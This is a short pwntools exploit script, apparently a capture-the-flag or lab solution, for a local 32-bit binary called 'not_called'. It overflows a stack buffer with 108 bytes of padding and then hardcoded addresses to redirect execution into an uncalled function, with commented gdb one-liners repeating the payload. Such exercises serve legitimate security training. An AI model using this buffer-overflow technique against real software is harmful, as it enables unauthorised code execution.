#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./not_called
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./not_called')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

#gdb = run `python -c 'print "B"*108+"\xd0\x63\xdf\xf7"*4+"\x0d\x56\x55\x56"'`
#gdb run < <(python -c 'from pwn import *; print "B"*108+p32(0xf7df63d0)+p32(0x5655560d)')

io = start()
padding="B"*108
exit_fun=p32(0xf7df63d0)
not_called=p32(0x5655560d)
io.sendline(padding+exit_fun+not_called)
io.interactive()


